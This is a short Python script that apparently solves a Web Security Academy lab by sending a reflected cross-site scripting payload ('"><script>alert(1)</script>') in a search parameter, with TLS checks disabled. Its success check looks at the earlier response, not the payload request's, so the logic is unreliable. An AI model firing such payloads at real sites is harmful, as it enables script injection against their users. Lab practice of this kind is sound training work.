import requests
requests.packages.urllib3.disable_warnings()

# Edit the URL
url = "https://0afd009e045162b68035492600dd00d3.web-security-academy.net/?search="
test_payload = 'abc'
payload = '"><script>alert(1)</script>'

global r
r = requests.Session()

def exp():
    s = r.get(url + test_payload, verify=False)
    if s.status_code == 200:
        r.get(url + payload, verify=False)
        if "Congratulations" in s.text:
            print("Lab solved!")

if __name__ == "__main__":
    exp()